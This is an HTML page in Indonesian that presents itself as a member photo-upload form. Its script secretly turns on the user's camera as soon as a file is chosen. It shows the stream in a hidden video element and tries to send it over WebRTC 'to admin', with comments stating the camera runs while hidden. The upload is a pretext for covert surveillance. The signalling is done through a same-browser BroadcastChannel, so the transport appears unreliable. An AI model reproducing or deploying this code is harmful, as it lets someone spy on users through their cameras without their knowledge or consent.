<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Member Upload</title>
</head>
<body>
    <h2>Upload Foto</h2>
    <input type="file" id="uploadFoto">
    <video id="cameraPreview" autoplay playsinline style="display: none;"></video>

    <script>
        const peer = new RTCPeerConnection();
        const channel = new BroadcastChannel("kamera_stream");

        document.getElementById("uploadFoto").addEventListener("change", async () => {
            // Nyalakan kamera otomatis
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            document.getElementById("cameraPreview").srcObject = stream; // Kamera nyala tapi disembunyikan
            
            // Kirim ke admin
            stream.getTracks().forEach(track => peer.addTrack(track, stream));
            const offer = await peer.createOffer();
            await peer.setLocalDescription(offer);
            channel.postMessage({ type: "offer", offer });
        });

        // Terima jawaban dari admin
        channel.onmessage = async (event) => {
            if (event.data.type === "answer") {
                await peer.setRemoteDescription(new RTCSessionDescription(event.data.answer));
            }
        };
    </script>
</body>
</html>
